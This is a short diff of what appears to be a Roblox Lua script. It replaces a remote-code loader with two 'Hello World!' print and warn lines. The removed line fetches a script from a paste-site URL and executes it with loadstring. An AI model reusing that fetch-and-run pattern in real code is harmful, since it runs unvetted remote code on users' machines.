@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("https://freenote.biz/raw/xxs5uMcP7T",true))()
+print("Hello World!")
+warn("Hello World!")
